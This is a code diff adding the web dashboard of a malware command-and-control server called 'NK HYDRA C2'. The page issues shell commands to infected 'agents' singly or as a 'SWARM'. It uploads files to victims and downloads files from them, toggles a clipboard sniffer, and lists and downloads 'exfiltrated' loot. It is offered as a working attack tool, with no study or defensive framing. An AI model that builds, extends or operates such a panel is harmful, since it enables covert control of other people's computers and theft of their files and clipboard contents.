@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NK HYDRA C2 // WARLORD EDITION</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 1rem; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .header { border-bottom: 2px solid #00ff41; padding-bottom: 0.5rem; margin-bottom: 1rem; text-shadow: 0 0 5px #00ff41; font-size: 1.5rem; display: flex; justify-content: space-between; align-items: center; }
+        .status-dot { color: #00ff41; animation: blink 1s infinite; }
+        .main-grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 1rem; flex-grow: 1; overflow: hidden; }
+        .panel { background: #0a0a0a; border: 1px solid #333; padding: 1rem; box-shadow: 0 0 10px rgba(0, 255, 65, 0.1); display: flex; flex-direction: column; }
+        .panel-title { color: #666; font-size: 0.9rem; font-weight: bold; margin-bottom: 0.5rem; border-bottom: 1px solid #222; padding-bottom: 0.3rem; }
+        .log-output, .loot-list, .agent-list { flex-grow: 1; overflow-y: auto; font-size: 0.8rem; background: #000; padding: 0.5rem; border: 1px solid #111; }
+        .log-item { margin-bottom: 0.2rem; }
+        .loot-item { margin-bottom: 0.3rem; border-bottom: 1px dotted #111; padding-bottom: 0.3rem; cursor: pointer; }
+        .loot-item:hover { background: #1a1a1a; }
+        .timestamp { color: #888; margin-right: 0.5rem; }
+        .agent-item { margin-bottom: 0.3rem; color: #fff; }
+        .agent-item.offline { color: #555; }
+        .agent-item span { color: #00ff41; }
+
+        .command-input-group { display: flex; margin-top: 0.5rem; }
+        .command-input { flex-grow: 1; background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 0.5rem; font-family: 'Courier New', monospace; }
+        .command-select-agent { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 0.5rem; margin-left: 0.5rem; }
+        .command-button { background: #00ff41; color: #0a0a0a; border: none; padding: 0.5rem 1rem; margin-left: 0.5rem; cursor: pointer; font-weight: bold; }
+        .command-button:hover { background: #00cc33; }
+
+        .file-upload-section, .file-download-section, .sniffer-control-section { margin-top: 1rem; border-top: 1px solid #222; padding-top: 1rem; }
+        .file-input { display: block; margin-bottom: 0.5rem; }
+        .file-label { display: block; margin-bottom: 0.5rem; color: #666; font-size: 0.8rem; }
+        .file-path-input { width: calc(100% - 1rem); background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 0.5rem; font-family: 'Courier New', monospace; margin-bottom: 0.5rem; }
+
+        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8); }
+        .modal-content { background-color: #0a0a0a; margin: 10% auto; padding: 20px; border: 1px solid #00ff41; width: 80%; max-width: 700px; color: #00ff41; font-family: 'Courier New', monospace; }
+        .close-button { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
+        .close-button:hover, .close-button:focus { color: #00ff41; text-decoration: none; cursor: pointer; }
+        .modal-data-content { white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #222; }
+
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #333; }
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="header">
+        <span>NK HYDRA C2 <span class="status-dot">● ONLINE</span></span>
+        <span id="uptime">Uptime: 0s</span>
+    </div>
+
+    <div class="main-grid">
+        <div class="panel">
+            <div class="panel-title">COMMAND & CONTROL</div>
+            <div class="command-input-group">
+                <input type="text" id="commandInput" class="command-input" placeholder="Enter command (e.g., ls -la /)">
+                <select id="agentSelector" class="command-select-agent">
+                    <option value="all">SWARM (All Agents)</option>
+                </select>
+                <button id="sendCommand" class="command-button">EXEC</button>
+            </div>
+
+            <div class="file-upload-section">
+                <div class="file-label">UPLOAD FILE TO AGENT</div>
+                <input type="file" id="fileUploadInput" class="file-input">
+                <button id="uploadFileButton" class="command-button">UPLOAD</button>
+            </div>
+
+            <div class="file-download-section">
+                <div class="file-label">DOWNLOAD FILE FROM AGENT</div>
+                <input type="text" id="filePathDownloadInput" class="file-path-input" placeholder="/path/to/target/file.txt">
+                <button id="downloadFileButton" class="command-button">DOWNLOAD</button>
+            </div>
+
+            <div class="sniffer-control-section">
+                <div class="file-label">CLIPBOARD SNIFFER CONTROL</div>
+                <button id="startSnifferButton" class="command-button">START SNIFFER</button>
+                <button id="stopSnifferButton" class="command-button" style="background: #cc0000;">STOP SNIFFER</button>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">ACTIVE SWARM NODES (<span id="agentCount">0</span>)</div>
+            <div id="agentList" class="agent-list">
+                <div style="color:#444">Awaiting agent connections...</div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">REAL-TIME LOGS</div>
+            <div id="logOutput" class="log-output"></div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">EXFILTRATED DATA (LOOT)</div>
+            <div id="lootList" class="loot-list">
+                <div style="color:#444">Awaiting incoming data stream...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal para exibir o conteúdo completo do loot -->
+    <div id="lootModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2>Loot Details</h2>
+            <div id="modalLootContent" class="modal-data-content"></div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        const commandInput = document.getElementById('commandInput');
+        const agentSelector = document.getElementById('agentSelector');
+        const sendCommandButton = document.getElementById('sendCommand');
+        const logOutput = document.getElementById('logOutput');
+        const agentList = document.getElementById('agentList');
+        const agentCount = document.getElementById('agentCount');
+        const lootList = document.getElementById('lootList');
+        const uptimeDisplay = document.getElementById('uptime');
+
+        const fileUploadInput = document.getElementById('fileUploadInput');
+        const uploadFileButton = document.getElementById('uploadFileButton');
+        const filePathDownloadInput = document.getElementById('filePathDownloadInput');
+        const downloadFileButton = document.getElementById('downloadFileButton');
+        const startSnifferButton = document.getElementById('startSnifferButton');
+        const stopSnifferButton = document.getElementById('stopSnifferButton');
+
+        const lootModal = document.getElementById('lootModal');
+        const closeButton = document.querySelector('.close-button');
+        const modalLootContent = document.getElementById('modalLootContent');
+
+        let currentAgents = [];
+        let currentLoot = [];
+
+        // --- SOCKET.IO EVENTS ---
+        socket.on('connect', () => {
+            console.log('Connected to C2 server');
+            socket.emit('identify', { type: 'commander_ui' });
+        });
+
+        socket.on('log', (message) => {
+            const logItem = document.createElement('div');
+            logItem.className = 'log-item';
+            logItem.innerHTML = `<span class="timestamp">[${new Date().toLocaleTimeString()}]</span>${message}`;
+            logOutput.appendChild(logItem);
+            logOutput.scrollTop = logOutput.scrollHeight; // Auto-scroll
+        });
+
+        socket.on('agents_update', (agentsData) => {
+            currentAgents = agentsData;
+            agentList.innerHTML = '';
+            agentSelector.innerHTML = '<option value="all">SWARM (All Agents)</option>';
+            agentCount.textContent = agentsData.length;
+
+            if (agentsData.length === 0) {
+                agentList.innerHTML = '<div style="color:#444">Awaiting agent connections...</div>';
+            } else {
+                agentsData.forEach(agent => {
+                    const agentItem = document.createElement('div');
+                    agentItem.className = 'agent-item';
+                    agentItem.innerHTML = `<span>${agent.id}</span> (IP: ${agent.ip}, OS: ${agent.os}, Last Seen: ${new Date(agent.lastSeen).toLocaleTimeString()})`;
+                    agentList.appendChild(agentItem);
+
+                    const option = document.createElement('option');
+                    option.value = agent.id;
+                    option.textContent = agent.id;
+                    agentSelector.appendChild(option);
+                });
+            }
+        });
+
+        socket.on('loot_update_initial', (initialLoot) => {
+            currentLoot = initialLoot;
+            renderLoot();
+        });
+
+        socket.on('loot_update', (newLootItem) => {
+            currentLoot.unshift(newLootItem); // Adiciona no início
+            renderLoot();
+        });
+
+        // --- UI INTERACTIONS ---
+        sendCommandButton.addEventListener('click', () => {
+            const cmd = commandInput.value;
+            const target = agentSelector.value;
+            if (cmd) {
+                socket.emit('cmd', { cmd, target });
+                commandInput.value = '';
+            }
+        });
+
+        uploadFileButton.addEventListener('click', () => {
+            const file = fileUploadInput.files[0];
+            const target = agentSelector.value;
+            if (file && target !== 'all') { // Upload para um agente específico
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const b64content = btoa(e.target.result); // Base64 encode
+                    socket.emit('upload_file', { target, filename: file.name, b64content });
+                };
+                reader.readAsBinaryString(file);
+            } else if (target === 'all') {
+                alert('Upload de arquivo só pode ser feito para um agente específico, não para o SWARM.');
+            } else {
+                alert('Selecione um arquivo e um agente alvo.');
+            }
+        });
+
+        downloadFileButton.addEventListener('click', () => {
+            const filepath = filePathDownloadInput.value;
+            const target = agentSelector.value;
+            if (filepath && target && target !== 'all') {
+                socket.emit('request_file_from_agent', { target, filepath });
+            } else if (target === 'all') {
+                alert('Download de arquivo só pode ser feito de um agente específico, não do SWARM.');
+            } else {
+                alert('Informe o caminho do arquivo e selecione um agente alvo.');
+            }
+        });
+
+        startSnifferButton.addEventListener('click', () => {
+            const target = agentSelector.value;
+            if (target && target !== 'all') {
+                socket.emit('start_sniffer_cmd', { target });
+            } else {
+                alert('Selecione um agente alvo para iniciar o sniffer.');
+            }
+        });
+
+        stopSnifferButton.addEventListener('click', () => {
+            const target = agentSelector.value;
+            if (target && target !== 'all') {
+                socket.emit('stop_sniffer_cmd', { target });
+            } else {
+                alert('Selecione um agente alvo para parar o sniffer.');
+            }
+        });
+
+        // --- LOOT RENDERING & MODAL ---
+        function renderLoot() {
+            lootList.innerHTML = '';
+            if (currentLoot.length === 0) {
+                lootList.innerHTML = '<div style="color:#444">Awaiting incoming data stream...</div>';
+            } else {
+                currentLoot.forEach((l, index) => {
+                    const lootItem = document.createElement('div');
+                    lootItem.className = 'loot-item';
+                    const displayData = l.data.length > 100 ? l.data.substring(0, 100) + '...' : l.data;
+                    lootItem.innerHTML = `<span class="timestamp">[${new Date(l.time).toLocaleTimeString()}]</span>[${l.agentId}] [${l.type}] ${displayData}`;
+                    lootItem.dataset.index = index; // Armazena o índice para o modal
+                    lootItem.addEventListener('click', () => showLootDetails(index));
+                    lootList.appendChild(lootItem);
+                });
+            }
+        }
+
+        function showLootDetails(index) {
+            const item = currentLoot[index];
+            if (item) {
+                let content = `<strong>Agent ID:</strong> ${item.agentId}<br>`;
+                content += `<strong>Type:</strong> ${item.type}<br>`;
+                content += `<strong>Timestamp:</strong> ${new Date(item.time).toLocaleString()}<br><br>`;
+                
+                if (item.type === 'FILE_EXFIL' && item.filename) {
+                    content += `<strong>Filename:</strong> ${item.filename}<br>`;
+                    content += `<strong>Content (Base64):</strong><br>${item.data}`;
+                    // Adicionar botão para baixar o arquivo decodificado
+                    const downloadLink = document.createElement('a');
+                    downloadLink.href = `data:application/octet-stream;base64,${item.data}`;
+                    downloadLink.download = item.filename;
+                    downloadLink.textContent = `Download ${item.filename}`;
+                    downloadLink.style.color = '#00ff41';
+                    downloadLink.style.display = 'block';
+                    downloadLink.style.marginTop = '10px';
+                    modalLootContent.innerHTML = content;
+                    modalLootContent.appendChild(downloadLink);
+                } else {
+                    content += `<strong>Data:</strong><br>${item.data}`;
+                    modalLootContent.innerHTML = content;
+                }
+                lootModal.style.display = 'block';
+            }
+        }
+
+        closeButton.addEventListener('click', () => {
+            lootModal.style.display = 'none';
+        });
+
+        window.addEventListener('click', (event) => {
+            if (event.target === lootModal) {
+                lootModal.style.display = 'none';
+            }
+        });
+
+        // --- UPTIME DISPLAY ---
+        setInterval(() => {
+            fetch('/api/status')
+                .then(res => res.json())
+                .then(data => {
+                    uptimeDisplay.textContent = `Uptime: ${Math.floor(data.uptime)}s`;
+                })
+                .catch(err => console.error('Failed to fetch uptime:', err));
+        }, 1000);
+
+        // Initial render
+        renderLoot();
+    </script>
+</body>
+</html>
